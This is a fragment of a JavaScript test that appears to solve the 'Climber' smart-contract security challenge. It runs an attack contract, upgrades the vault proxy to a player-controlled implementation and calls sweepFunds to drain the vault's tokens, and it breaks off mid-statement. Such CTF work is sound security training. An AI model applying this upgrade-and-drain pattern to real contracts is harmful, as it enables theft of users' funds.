...
describe("[Challenge] Climber", function () {
  ...
  it("Execution", async function () {
    ...
    const ClimberVaultUpgradeFactory = await ethers.getContractFactory(
      "ClimberVaultUpgrade",
      player
    );
    await AttackContract.connect(player).attack();

    const updatedVault = await upgrades.upgradeProxy(
      vault.address,
      ClimberVaultUpgradeFactory
    );

    await updatedVault.connect(player).sweepFunds(token.address);
    console.log(
